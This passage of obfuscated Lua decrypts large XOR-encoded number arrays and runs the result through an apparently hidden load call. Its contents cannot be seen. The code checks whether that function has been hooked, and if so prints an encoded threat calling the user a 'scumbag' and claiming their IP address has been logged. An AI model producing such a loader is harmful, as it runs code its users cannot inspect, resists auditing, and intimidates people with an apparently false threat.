  813, 898, 587, 597, 544, 1019, 723, 835, 784, 983, 962, 822, 1037, 795, 596, 942, 801, 653, 662, 712, 851, 682, 756,
  625, 583, 1069, 1024, 553, 825, 1048, 793, 1145, 1065, 959, 845, 877, 1156, 807, 571, 690, 1128, 598, 939, 1199, 1172,
  941, 595, 780, 838, 859, 678, 1161, 728, 1112, 1056, 860, 1194, 1136, 824, 1075, 919, 622, 1147, 1011, 853, 1082, 1135,
  1061, 932, 1105, 616, 901, 1187, 1121, 1119, 999, 1206, 816, 953, 710, 594, 1046, 963, 1064, 1195, 1126, 1041, 1102,
  796, 905, 732, 910, 934, 1033, 869, 654, 1107, 1151, 676, 1050, 1203, 1186, 1192, 1092, 581, 614, 1209, 666, 681, 631,
  1166, 545, 613, 1204, 1111, 1124, 971, 726, 721, 1146, 589, 1047, 716, 747, 640, 798, 800, 1110, 706, 1055, 940, 876,
  873, 970, 1211, 923, 895, 665, 729, 866, 1139, 884, 1160, 644, 1120, 900, 623, 683, 1098, 1081, 1089, 630, 1104, 551,
  736, 753, 621, 989, 1164, 852, 809, 661, 832, 1088, 948, 1148, 626, 624, 627, 543, 552, 549, 847, 1087, 1012, 985, 725,
  1014, 1123, 593, 817, 1205, 888, 975, 830, 1029, 563, 568, 1015, 1163, 759, 774, 559, 1117, 812, 738, 770, 1031, 1118,
  957, 1158, 1021, 918, 1179, 808, 787, 668, 1097, 1171, 620, 885, 799, 1181, 699, 1074, 1174, 772, 586, 880, 1042, 857,
  632, 936, 658, 831, 1197, 933, 1038, 924, 865, 1138, 1068, 790, 1034, 582, 1202, 754, 1032, 914, 1063, 576, 652, 570,
  944, 1030, 991, 1076, 1144, 836, 763, 1018, 1115, 669, 619, 1185, 667, 734, 1142, 943, 841, 659, 1085, 1009, 788, 839,
  843, 1155, 1077, 814, 979, 834, 1066, 899, 1173, 1140, 1149, 1101, 660, 882, 960, 578, 995, 1143, 886, 1052, 878, 954,
  805, 1099, 931, 1127, 565, 993, 902, 868, 949, 768, 874, 1049, 842, 1017, 1051, 617, 1201, 1060, 955, 887, 929, 564,
  685, 904, 1023, 546, 750, 558, 686, 1073, 1175, 585, 867, 1003, 1191, 749, 946, 1150, 862, 1207, 893, 1132, 599, 908,
  560, 1106, 739, 1090, 696, 856, 906, 1177, 921, 561, 714, 1200, 1170, 707, 1040, 930, 1080, 715, 789, 1193, 1008, 590,
  591, 708, 717, 604, 634, 794, 1059, 863, 913, 810, 827, 655, 773, 973, 1020, 846, 713, 672, 1058, 698, 695, 580, 684,
  637, 848, 1026, 740, 1134, 818, 608, 646, 1178, 765, 1027, 592, 1196, 1022, 926, 720, 829, 786, 579, 638, 1079, 909,
  1095, 1078, 776, 820, 745, 692, 758, 997, 928, 1154, 915, 982, 833, 1131, 1086, 752, 1067, 998, 858, 663, 1113, 881,
  849, 709, 1182, 978, 1129, 1169, 951, 757, 779, 894, 1043, 907, 879, 1053, 1083, 1109, 1057, 562, 811, 673, 1028, 1100,
  1103, 823, 1002, 797, 950, 1168, 804, 657, 628, 1096, 697, 1167, 840, 1000, 958, 1188, 1208, 722, 925, 704, 600, 755,
  612, 636, 1141, 647, 577, 607, 896, 569, 680, 850, 897, 670, 819, 711, 1108, 889, 675, 922, 1190, 746, 1084, 677, 743,
  1184, 1006, 557, 702, 762, 1010, 1114, 920, 1189, 987, 945, 651, 1062, 691, 641, 802, 1176, 602, 688, 629, 656, 649,
  821, 1054, 826, 705, 719, 968, 730, 687, 575, 791, -1, 92, 11, 16, 80, 49, 196, 94, 182, 127, 17, 72, 41, 3, 237, 113,
  61, 73, 97, 59, 45, 67, 22, 77, 70, 24, 21, 74, 20, 4, 121, 243, 245, 54, 1, 80, 19, 110, 78, 30, 21, 6, 10, 3, 44, 32,
  229, 55, 22, 76, 122, 106, 59, 19, 31, 3, 24, 73, 30, 4, 78, 11, 67, 115, 73, 72, 2, 247, 172, 235, 60, 28, 12, 134,
  75, 53, 52, 40, 5, 65, 121, 107, 93, 127, 86, 77, 87, 45, 126, 86, 82, 138, 97, 239, 120, 15, 25, 161, 3, 94, 220, 152,
  67, 22, 53, 18, 100, 98, 18, 68, 30, 73, 25, 80, 53, 16, 24, 4, 15, 0, 67, 13, 81, 23, 96, 60, 12, 5, 84, 7, 20, 42,
  79, 74, 77, 5, 85, 110, 68, 2, 59, 78, 28, 120, 12, 83, 79, 253, 23, 3, 80, 199, 1, 55, 120, 78, 30, 73, 20, 113, 85,
  70, 36, 68, 91, 91, 103, 25, 6, 121, 97, 92, 14, 100, 10, 73, 49, 102, 72, 88, 73, 78, 193, 87, 25, 32, 92, 66, 83,
  215, 74, 154, 69, 246, 89, 241, 80, 121, 86, 12, 7, 12, 217, 74, 76, 51, 167, 26, 72, 62, 120, 10, 33, 61, 30, 15, 22,
  70, 114, 33, 55, 25, 1, 49, 79, 118, 78, 106, 82, 123, 6, 4, 107, 156, 78, 3, 215, 68, 54, 191, 154, 102, 5, 16, 5, 42,
  2, 72, 15, 14, 37, 17, 80, 18, 11, 66, 113, 30, 77, 103, 19, 250, 108, 26, 7, 1, 83, 86, 5, 83, 67, 30, 74, 62, 72, 77,
  4, 125, 72, 75, 72, 28, 70, 45, 73, 64, 171, 48, 103, 51, 65, 21, 78, 69, 85, 34, 82, 20, 74, 87, 17, 6, 92, 22, 16,
  116, 8, 74, 92, 19, 77, 25, 137, 137, 74, 66, 20, 61, 26, 233, 30, 22, 25, 63, 111, 72, 3, 46, 102, 30, 96, 115, 0,
  165, 68, 58, 26, 53, 11, 68, 22, 121, 68, 28, 55, 80, 87, 72, 80, 174, 167, 76, 19, 74, 116, 8, 11, 68, 75, 102, 72,
  160, 74, 13, 18, 13, 67, 16, 3, 55, 130, 62, 13, 12, 177, 76, 80, 24, 89, 11, 80, 30, 95, 67, 89, 39, 103, 121, 80, 70,
  103, 89, 85, 62, 94, 86, 103, 47, 87, 97, 102, 13, 54, 74, 0, 199, 80, 117, 77, 0, 200, 80, 21, 75, 71, 73, 22, 66, 47,
  249, 66, 3, 170, 95, 103, 164, 89, 151, 88, 74, 229, 49, 116, 90, 87, 36, 68, 123, 62, 120, 37, 53, 246, 109, 255, 116,
  158, 79, 88, 71, 137, 3, 134, 45, 33, 76, 93, 40, 80, 125, 49, 3, 24, 129, 20, 99, 80, 36, 14, 13, 68, 212, 104, 65,
  224, 82, 53, 87, 30, 97, 16, 18, 28, 90, 66, 30, 80, 82, 3, 3, 24, 30, 65, 43, 56, 9, 110, 52, 16, 17, 27, 94, 190,
  254, 74, 8, 74, 15, 113, 9, 4, 65, 107, 6, 115, 4, 16, 121, 74, 0, 25, 87, 80, 5, 70, 9, 52, 93, 81, 200, 34, 68, 52,
  94, 25, 84, 121, 70, 126, 120, 21, 15, 103, 70, 11, 81, 28, 66, 22, 135, 87, 88, 142, 87, 121, 93, 82, 38, 80, 103, 43,
  9, 26, 84, 80, 23, 78, 36, 127, 78, 72, 116, 87, 12, 10, 21, 77, 17, 2, 121, 221, 14, 30, 222, 16, 68, 22, 5, 2, 121,
  103, 151, 32, 90, 67, 178, 95, 73, 64, 74, 119, 95, 21, 25, 76, 28, 106, 64, 15, 97, 150, 6, 10, 15, 5, 20, 67, 249,
  77, 21, 186, 3, 120, 37, 20, 72, 16, 48, 25, 2, 16, 80, 85, 77, 117, 80, 19, 9, 224, 16, 21, 219, 32, 28, 113, 92, 76,
  98, 22, 121, 96, 74, 8, 0, 68, 25, 241, 0, 1, 26, 11, 17, 117, 30, 6, 60, 103, 94, 152, 81, 116 },
  "jd9f0wYnhjp6lGicApY6Xj2phT"); l3GK6JRwkZ04KDZYjlqqs1xI3Wqa9P352HCQjEwhRm79dBLKvVniFYAvHrH1WAlF =
qRRd6rEt5Xx25vadSrbyGcnBz1Dpn5soJXUXYiyazXzQvrr0lIO5cNCu7D4JuonsSDRf; nx3HvLqUxTfVeHy7oc3vEBDBrbswqYYqWt3AUgGpehDNUtToD1dtRAvKDX =
qRRd6rEt5Xx25vadSrbyGcnBz1Dpn5soJXUXYiyazXzQvrr0lIO5cNCu7D4JuonsSDRf; c0wBSNdtWxxcG0r1z4AfB6bjDjPtt9qEvbbwWlTFh7NYk2CO6vBb3dSpLFpl =
nx3HvLqUxTfVeHy7oc3vEBDBrbswqYYqWt3AUgGpehDNUtToD1dtRAvKDX; oKitW6nIB9znc7LN8x4g9Wgkq1PIlSxm7qb4IW6ACTF8Bce5TC8ms9A8xFbVcR0aTdd4iOIk =
c0wBSNdtWxxcG0r1z4AfB6bjDjPtt9qEvbbwWlTFh7NYk2CO6vBb3dSpLFpl; dzmahxPN7s1LtvPJus2TE7Xn6DeNlvuBApgtbVhhQPSRUtsFUcJD7A1pkBkpEWR4ouTLfS =
oKitW6nIB9znc7LN8x4g9Wgkq1PIlSxm7qb4IW6ACTF8Bce5TC8ms9A8xFbVcR0aTdd4iOIk; qSumzpUuRR1jKJvQOc2ZBAiwbTW51QjdPsWOg3DUsvKEanf6m34572KIQ =
dzmahxPN7s1LtvPJus2TE7Xn6DeNlvuBApgtbVhhQPSRUtsFUcJD7A1pkBkpEWR4ouTLfS; bHE2SsMdqNoIPW5W5A3deiTJ49Re555uH0TF7LWpQp6g8Ap9CK4nXXp3UDl6FQ4r5OJJz =
qSumzpUuRR1jKJvQOc2ZBAiwbTW51QjdPsWOg3DUsvKEanf6m34572KIQ; jun9a0BDAgJYbrtM2nnRJ5rcD75oy0lzhSeveKE6GAI17pN9jn7rA8py8IVa4iE3TSZPIvT =
bHE2SsMdqNoIPW5W5A3deiTJ49Re555uH0TF7LWpQp6g8Ap9CK4nXXp3UDl6FQ4r5OJJz; cG3pnWpizyZOdPHxioMl6HIXK9kI4TD2jkBYVZ67oewP6whPCVVClabr0SQoSEYp3X2Bb8 =
jun9a0BDAgJYbrtM2nnRJ5rcD75oy0lzhSeveKE6GAI17pN9jn7rA8py8IVa4iE3TSZPIvT; kLM76XqyyRT3biPoK91HEbbXMojc0wrcx3Ye1XTLWxRbjmT9zKdKoQKUgUh =
cG3pnWpizyZOdPHxioMl6HIXK9kI4TD2jkBYVZ67oewP6whPCVVClabr0SQoSEYp3X2Bb8; o5fuNbvGAAVRiZiB7gWBRIdva6qCEz5J5JAJETsNmI6aXyr4A0LfeQ5kQcWQFqt53aGYIiYknO =
kLM76XqyyRT3biPoK91HEbbXMojc0wrcx3Ye1XTLWxRbjmT9zKdKoQKUgUh; o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD = function(
  a)
  K, F = 3819440442136563, 16384 + 8862; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; oD4UAfOVF8dngrqGlwvp6cmdLusBfb0ImULojupYWKzSW4pByngPr3ze3ze = function(b)
  co = coroutine.create(b)
  yTj7xvYsNBKt0UZ6i7nkJsBSV09qS32grxTVXU8z1IRJsXhhL5Y7hleezOcKb0Z2iHa38IDH9JW = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(yTj7xvYsNBKt0UZ6i7nkJsBSV09qS32grxTVXU8z1IRJsXhhL5Y7hleezOcKb0Z2iHa38IDH9JW, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return yTj7xvYsNBKt0UZ6i7nkJsBSV09qS32grxTVXU8z1IRJsXhhL5Y7hleezOcKb0Z2iHa38IDH9JW
end; xsaHkgf0YbJRh0QzZdEpWykq0tO1QeJWUz1dpRndSdRi3zrxkqTS8NR7dbVSYHMH = function(f, g)
  slGYuZabp7n6DFvuPGDqYxDlQOFzvWypuZM5BGTL7NOdCHwoguVhEx8fUVR = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; o157WQuXqyUt1R3zD8wQmBMpqOG8G31x1QRd9bcQ10Fa71hiFzv = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; xd7wO9urrShk2QfrOpjJjjTU6OxLQ7ubcoyVXHxIx0XssrMxP7v2RPKBJafST = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      slGYuZabp7n6DFvuPGDqYxDlQOFzvWypuZM5BGTL7NOdCHwoguVhEx8fUVR(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; eemugBuGiyPumh7s4q4eTLZneD8aFIm9woNX33wD5wpIwaHFzbMASJ817JZ3O3E9AZw = function(p, n)
    hGd5eTvnbZJAhL2aW6DOyckdcGfUoLOu4UjtqN4Be9giJebpaC2p = ""
    for k, q in pairs(p) do hGd5eTvnbZJAhL2aW6DOyckdcGfUoLOu4UjtqN4Be9giJebpaC2p =
      hGd5eTvnbZJAhL2aW6DOyckdcGfUoLOu4UjtqN4Be9giJebpaC2p ..
      o5fuNbvGAAVRiZiB7gWBRIdva6qCEz5J5JAJETsNmI6aXyr4A0LfeQ5kQcWQFqt53aGYIiYknO
      [o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('71') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('E0') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('02') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('1B') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('46') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('3D')]
      [o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('81') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('AC') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('A3') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('02')](
      q) end
    ; n(hGd5eTvnbZJAhL2aW6DOyckdcGfUoLOu4UjtqN4Be9giJebpaC2p)
  end; o157WQuXqyUt1R3zD8wQmBMpqOG8G31x1QRd9bcQ10Fa71hiFzv(f,
    function(r) xd7wO9urrShk2QfrOpjJjjTU6OxLQ7ubcoyVXHxIx0XssrMxP7v2RPKBJafST(r, g,
        function(s) eemugBuGiyPumh7s4q4eTLZneD8aFIm9woNX33wD5wpIwaHFzbMASJ817JZ3O3E9AZw(s,
            function(t) if #oD4UAfOVF8dngrqGlwvp6cmdLusBfb0ImULojupYWKzSW4pByngPr3ze3ze(o5fuNbvGAAVRiZiB7gWBRIdva6qCEz5J5JAJETsNmI6aXyr4A0LfeQ5kQcWQFqt53aGYIiYknO[o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('68') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('B5') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('A3') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('F0')]) == 1 then if o5fuNbvGAAVRiZiB7gWBRIdva6qCEz5J5JAJETsNmI6aXyr4A0LfeQ5kQcWQFqt53aGYIiYknO[o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('68') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('B5') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('A3') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('F0')] == o5fuNbvGAAVRiZiB7gWBRIdva6qCEz5J5JAJETsNmI6aXyr4A0LfeQ5kQcWQFqt53aGYIiYknO[o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('24') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('02') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('1B') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('46') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('E0')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if o5fuNbvGAAVRiZiB7gWBRIdva6qCEz5J5JAJETsNmI6aXyr4A0LfeQ5kQcWQFqt53aGYIiYknO[o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('68') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('B5') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('A3') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('F0')](t) then
                    o5fuNbvGAAVRiZiB7gWBRIdva6qCEz5J5JAJETsNmI6aXyr4A0LfeQ5kQcWQFqt53aGYIiYknO
                        [o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('68') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('B5') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('A3') .. o269u8p49AOBulHQJdqZwJkTnq8Ipu1XoexdHqVth3cXros7lwxh6RqSCkbbLmi6UfxZgvstbD('F0')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; xsaHkgf0YbJRh0QzZdEpWykq0tO1QeJWUz1dpRndSdRi3zrxkqTS8NR7dbVSYHMH(
{ 730, 868, 675, 1178, 857, 1120, 790, 659, 563, 1107, 941, 894, 826, 830, 969, 975, 795, 846, 1070, 1148, 1199, 625,
  677, 1083, 717, 829, 922, 862, 592, 577, 771, 968, 680, 654, 587, 861, 1034, 1210, 900, 635, 602, 818, 1176, 872, 1156,
  945, 879, 630, 764, 673, 646, 978, 964, 1131, 1175, 880, 1019, 786, 824, 1054, 919, 1205, 888, 1198, 1115, 1192, 1073,
  703, 908, 869, 877, 940, 643, 871, 883, 1051, 1204, 1022, 1036, 1016, 1193, 1188, 574, 567, 986, 724, 616, 821, 865,
  1084, 1147, 769, 937, 984, 706, 727, 641, 938, 1066, 738, 1053, 725, 624, 923, 768, 781, 925, 974, 620, 642, 603, 1174,
  1134, 1088, 797, 979, 1180, 1201, 697, 1113, 1130, 988, 1164, 943, 612, 1105, 976, 955, 1117, 611, 928, 1025, 855, 746,
  1068, 595, 627, 952, 1129, 558, 637, 813, 942, 699, 682, 572, 1096, 633, 653, 591, 1056, 983, 1167, 1185, 1047, 816,
  899, 893, 812, 799, 665, 702, 903, 704, 1040, 716, 722, 1183, 676, 854, 1075, 686, 841, 690, 693, 1163, 973, 833, 902,
  1027, 1114, 980, 672, 1208, 1087, 966, 688, 926, 578, 838, 822, 1194, 694, 579, 859, 661, 583, 774, 1145, 798, 1032,
  920, 962, 834, 1024, 664, 927, 544, 882, 744, 954, 1151, 696, 803, 1080, 621, 949, 698, 1170, 589, 571, 606, 948, 681,
  981, 599, 554, 721, 756, 701, 619, 601, 863, 1015, 735, 1195, 870, 549, 609, 645, 604, 987, 1099, 1112, 1098, 670, 719,
  876, 1006, 605, 985, 1020, 1191, 831, 807, 1061, 584, 1048, 1003, 573, 819, 691, 1177, 1154, 881, 747, 776, 897, 815,
  1030, 1009, 1143, 779, 551, 1179, 1118, 608, 1110, 1093, 1108, 669, 995, 662, 1146, 1209, 1181, 740, 805, 1137, 614,
  934, 1212, 784, 1150, 700, 967, 726, 820, 1133, 1169, 802, 1067, 911, 1190, 1140, 1100, 1086, 956, 555, 814, 1058, 837,
  1043, 1023, 762, 1123, 734, 1159, 1076, 912, 632, 794, 823, 961, 878, 856, 930, 1211, 1207, 683, 656, 638, 924, 1069,
  613, 853, 1029, 1063, 1055, 933, 936, 763, 617, 777, 965, 564, 1074, 739, 1011, 1065, 657, 791, 547, 1059, 660, 997,
  875, 1144, 755, 1057, 1116, 935, 772, 811, 887, 556, 629, 1189, 576, 915, 1045, 651, 953, 1135, 827, 649, 789, 692,
  1004, 1132, 626, 999, 832, 851, 874, 1081, 751, 728, 1005, 898, 1014, 845, 890, 939, 588, 597, 1085, 765, 959, 1035,
  668, 906, 1001, 1142, 785, 957, 593, 989, 568, 679, 1044, 1200, 963, 1127, 658, 745, 1157, 655, 1017, 977, 1095, 685,
  921, 600, 666, 1072, 914, 809, 559, 960, 873, 982, 896, 707, 1021, 892, 775, 1097, 783, 647, 550, 622, 991, 598, 992,
  852, 1203, 648, 889, 858, 754, 618, 770, 849, 566, 580, 553, 1090, 947, 1128, 1060, 793, 958, 607, 886, 757, 1171,
  1007, 993, 678, 718, 840, 951, 750, 944, 628, 905, 760, 1000, 842, 1028, 731, 1187, 687, 766, 1168, 1119, 1052, 917,
  970, 684, 1033, 548, 1002, 1010, 1089, 1122, 828, 1018, 972, 753, 758, 1042, 650, 1049, 759, 634, 640, 895, 1031, 712,
  835, 1109, 733, 844, 1162, 570, 737, 742, 1166, 796, 1149, 918, 741, 885, 1092, 543, 711, 1064, 545, 990, 850, 1206,
  667, 596, 581, 636, 848, 907, 836, 1196, 557, -1, 84, 68, 53, 116, 117, 65, 33, 4, 61, 162, 125, 60, 111, 38, 3, 82,
  21, 143, 235, 183, 127, 68, 194, 84, 25, 4, 152, 34, 90, 15, 2, 13, 239, 67, 91, 75, 102, 61, 65, 10, 109, 52, 55, 58,
  23, 67, 37, 90, 72, 29, 4, 202, 29, 117, 31, 109, 78, 16, 62, 117, 10, 13, 92, 69, 93, 25, 6, 116, 125, 27, 103, 26,
  232, 82, 27, 92, 40, 67, 23, 87, 207, 15, 1, 80, 84, 16, 83, 11, 132, 95, 29, 21, 111, 87, 13, 19, 241, 111, 76, 16,
  87, 180, 7, 65, 40, 4, 97, 82, 58, 231, 68, 28, 73, 76, 21, 65, 93, 80, 124, 34, 155, 107, 68, 23, 99, 28, 29, 41, 217,
  79, 32, 72, 22, 18, 50, 106, 27, 20, 70, 52, 78, 103, 86, 87, 70, 79, 130, 92, 42, 111, 75, 72, 240, 80, 37, 91, 63,
  25, 1, 67, 21, 23, 101, 87, 11, 252, 22, 124, 16, 17, 143, 195, 67, 85, 2, 90, 65, 90, 86, 87, 206, 66, 108, 68, 66,
  108, 239, 98, 111, 247, 80, 27, 28, 112, 101, 11, 23, 0, 22, 107, 6, 100, 19, 1, 21, 32, 168, 86, 53, 99, 88, 80, 18,
  64, 53, 16, 97, 82, 172, 7, 22, 40, 16, 21, 36, 72, 111, 7, 22, 2, 198, 65, 18, 23, 2, 183, 64, 32, 36, 217, 40, 90,
  56, 23, 223, 196, 21, 10, 111, 109, 86, 23, 21, 72, 23, 73, 95, 220, 212, 51, 71, 245, 51, 216, 94, 60, 97, 31, 24, 84,
  47, 41, 24, 80, 123, 70, 26, 55, 1, 2, 5, 27, 153, 103, 68, 29, 3, 42, 90, 76, 84, 64, 10, 86, 5, 8, 9, 121, 73, 97,
  102, 93, 55, 29, 55, 71, 41, 21, 19, 0, 108, 99, 28, 61, 5, 94, 7, 238, 17, 44, 12, 158, 1, 81, 180, 19, 13, 3, 88, 13,
  54, 84, 76, 59, 3, 80, 21, 16, 77, 80, 96, 50, 13, 37, 12, 3, 17, 22, 109, 14, 118, 49, 57, 20, 93, 18, 90, 63, 200,
  127, 78, 82, 23, 53, 102, 80, 67, 191, 30, 16, 110, 68, 81, 127, 18, 83, 94, 11, 88, 1, 24, 18, 26, 81, 83, 98, 196,
  38, 151, 155, 99, 7, 108, 7, 104, 20, 1, 87, 16, 21, 20, 88, 27, 100, 21, 117, 74, 184, 67, 16, 23, 95, 34, 9, 7, 64,
  67, 111, 37, 0, 101, 72, 88, 84, 92, 4, 36, 71, 106, 124, 21, 21, 19, 34, 83, 14, 34, 91, 80, 9, 86, 78, 95, 88, 85,
  83, 13, 33, 70, 83, 64, 55, 0, 147, 78, 196, 78, 68, 15, 87, 2, 117, 13, 37, 18, 210, 1, 72, 10, 49, 182, 28, 63, 47,
  83, 7, 17, 65, 76, 80, 99, 107, 37, 12, 125, 21, 65, 1, 9, 93, 108, 6, 23, 24, 84, 252, 71, 27, 56, 23, 68, 16, 95, 62,
  77, 41, 68, 55, 96, 57, 61, 91, 14, 21, 71, 19, 70, 24, 2, 184, 30, 16, 75, 66, 19, 67, 71, 76, 134, 82, 60, 95, 114,
  84, 189, 98, 134, 74, 8, 219, 34, 45, 22, 93, 74, 82, 99, 10, 76, 18, 9, 239, 67, 2, 4, 70, 68, 90, 60, 31, 225, 135,
  109, 92, 6, 64, 68, 2, 236, 90, 18, 70, 65, 103, 5, 0, 8, 25, 1, 22, 22, 182, 121, 204, 101, 26, 65, 80, 54, 70, 25,
  82, 82, 248, 76, 94, 169, 24, 7, 40, 34, 19, 92, 56, 89, 14, 99, 16, 84, 165, 92, 20, 208, 14, 7, 45, 2, 166, 192, 3,
